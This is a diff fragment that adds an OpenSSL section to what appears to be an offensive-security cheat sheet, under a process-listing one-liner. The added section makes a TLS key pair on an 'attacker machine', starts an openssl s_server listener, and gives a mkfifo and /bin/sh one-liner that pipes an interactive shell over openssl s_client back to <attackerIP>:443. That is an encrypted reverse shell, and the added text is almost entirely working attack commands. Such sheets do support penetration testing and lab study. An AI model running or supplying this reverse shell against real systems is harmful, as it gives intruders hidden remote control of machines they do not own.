@@ -496,3 +496,15 @@ ps aux | awk '{print $11}' |xargs -r ls -la 2>/dev/null |awk '!x[$0]++'
 
 
 ---------------------------------
+
+# OpenSSL (linux use)
+
+- Generate an SSL cert key/pair on attacker machine
+openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
+
+- start the listener on our attacker machine and specify the .pem files we created
+openssl s_server -quiet -key key.pem -cert cert.pem -port 443
+
+- Create mkfifo named pipe as a filed called "x" in /tmp in conjunction with an openssl s_client -quiet -connect command that will connect back to our attacker machine 
+mkfifo /tmp/x; /bin/sh -i < /tmp/x 2>&1 \ | openssl s_client -quiet -connect <attackerIP>:443 > /tmp/x; rm /tmp/x
+
